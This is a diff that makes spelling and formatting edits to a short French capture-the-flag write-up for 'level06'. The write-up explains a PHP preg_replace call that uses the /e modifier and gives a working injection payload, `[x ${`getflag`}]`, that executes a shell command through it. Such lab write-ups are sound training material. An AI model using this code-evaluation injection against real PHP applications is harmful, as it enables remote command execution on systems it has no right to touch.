@@ -1,4 +1,4 @@
-Dans le level06 on as un binaire un fichier php
+Dans le level06 on as un binaire un fichier PHP
 
 ```php
 <?php
@@ -26,10 +26,9 @@ On decortique le code, la ligne qui nous interesse le plus est
 ```php
  preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
  ```
- dans le fichier il faudrais mettre `[x des trucs]`
- cela nous affiche `des trucs`
+ dans le fichier il faudrais mettre `[x des trucs]` cela nous affiche `des trucs`
 
- cela ressemple a l'excise avec le serveur perl
+ Cela ressemple à l'exercise avec le serveur perl
 
- on test `[x ${`getflag`}]` ca marche !
+On test `[x ${`getflag`}]` ca marche !
 
